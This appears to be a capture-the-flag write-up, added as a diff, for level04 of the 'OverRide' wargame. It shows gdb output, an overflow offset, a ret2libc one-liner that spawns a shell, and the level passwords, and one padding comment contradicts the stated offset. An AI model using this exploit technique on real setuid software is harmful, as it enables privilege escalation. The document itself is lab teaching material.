@@ -1,0 +1,90 @@
+Authenticating as level04/kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+
+We come across a suid binary named level04.
+
+The binary seems to be vulnerable to buffer over flow as it includes a gets@ptl without prior protection
+The only problem here is that the gets function is being called in the child process.
+
+So first we need to get the offset, to do that we need to set gdb to follow the child process
+(gdb) set follow-fork-mode child
+(gdb) break main
+Breakpoint 1 at 0x80486cd
+(gdb) run
+Starting program: /home/users/level04/level04
+(gdb) c
+Continuing.
+[New process 1650]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1650]
+0x41326641 in ?? ()
+
+Now we can determine the offset by taking the new RIP address to the pattern website and get the offset ( 156 )
+
+We were able to determine the offset, Now we need to find a way to run shellcode to spawn a shell.
+
+After doing so, the program have some protection on it that doesn't allow shellcode to be executed.
+level04@OverRide:~$ (python -c 'print "A"*156 + "\x7a\xd8\xff\xff"';cat) | ./level04
+Give me some shellcode, k
+no exec() for you
+
+So we are going to use ret2libc method that allow us to spawn a shell using libc function.
+
+Now we going to search for the address of system syscall in the libc
+(gdb) break main
+Breakpoint 1 at 0x80486cd
+(gdb) run
+Starting program: /home/users/level04/level04
+
+Breakpoint 1, 0x080486cd in main ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb)
+
+The only thing that is left is the argument which /bin/sh, we need to look in the libc for the address that hold the string
+"/bin/sh"
+
+(gdb) info proc map
+process 1673
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fda000 0xf7fdb000     0x1000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000 0xf7fcf100 "bin/sh"
+A syntax error in expression, near `0xf7fcf100 "bin/sh"'.
+(gdb) find 0xf7e2c000, 0xf7fcf100, "/bin/sh"
+0xf7f897ec
+1 pattern found.
+(gdb)
+
+Finally the exploit would go as follow
+
+inp="A"*0x10 # The initial junk bytes to fill u the stack space
+inp+="\xd0\xae\xe6\xf7" # Overwrite the save eip with address of system
+inp+="AAAA" # This is the return address of system. Since it will never return, we can give junk here.
+inp+="\xec\x97\xf8\xf7" #The argument to system. This is the pointer to the string "/bin/sh"
+
+level04@OverRide:~$ (python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "A"*4 + "\xec\x97\xf8\xf7"';cat) | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+And Here it is, the password for level05.
